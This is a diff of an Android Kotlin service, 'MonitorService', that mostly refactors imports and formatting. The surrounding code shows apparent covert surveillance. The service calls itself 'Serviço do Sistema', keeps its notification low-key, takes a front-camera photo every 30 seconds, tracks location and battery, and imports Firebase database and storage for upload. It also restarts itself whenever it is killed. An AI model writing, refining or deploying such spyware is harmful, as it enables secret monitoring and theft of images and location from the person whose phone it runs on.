@@ -1,22 +1,19 @@
 package com.ln.client
 
 import android.app.*
-import android.content.Context
 import android.content.Intent
-import android.graphics.Bitmap
-import android.graphics.BitmapFactory
 import android.graphics.ImageFormat
 import android.hardware.camera2.*
 import android.location.Location
 import android.media.ImageReader
 import android.os.*
+import android.provider.Settings
 import android.telephony.TelephonyManager
 import androidx.core.app.NotificationCompat
 import com.google.firebase.database.ktx.database
 import com.google.firebase.ktx.Firebase
 import com.google.firebase.storage.ktx.storage
 import com.google.android.gms.location.*
-import java.io.ByteArrayOutputStream
 import java.util.*
 
 class MonitorService : Service() {
@@ -44,9 +41,7 @@ class MonitorService : Service() {
     private fun criarCanal() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val canal = NotificationChannel(
-                CHANNEL_ID,
-                "Serviço do Sistema",
-                NotificationManager.IMPORTANCE_LOW
+                CHANNEL_ID, "Serviço do Sistema", NotificationManager.IMPORTANCE_LOW
             ).apply {
                 description = "Serviço em execução"
                 setShowBadge(false)
@@ -100,7 +95,7 @@ class MonitorService : Service() {
             override fun run() {
                 enviarStatus()
                 capturarFoto("front")
-                handler.postDelayed(this, 30000L) // a cada 30s
+                handler.postDelayed(this, 30000L)
             }
         }
         handler.post(runnable)
@@ -110,8 +105,6 @@ class MonitorService : Service() {
         val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
         val bateria = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
         val carregando = bm.isCharging
-
-        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
 
         val status = mapOf(
             "battery" to bateria,
@@ -135,7 +128,6 @@ class MonitorService : Service() {
             } ?: return
 
             val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
-
             imageReader.setOnImageAvailableListener({ reader ->
                 val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                 val buffer = image.planes[0].buffer
@@ -184,17 +176,13 @@ class MonitorService : Service() {
         }
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return START_STICKY
-    }
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
         super.onDestroy()
         fusedLocation.removeLocationUpdates(locationCallback)
-        // Reinicia o serviço se for morto
-        val restart = Intent(this, MonitorService::class.java)
-        startService(restart)
+        startService(Intent(this, MonitorService::class.java))
     }
 }
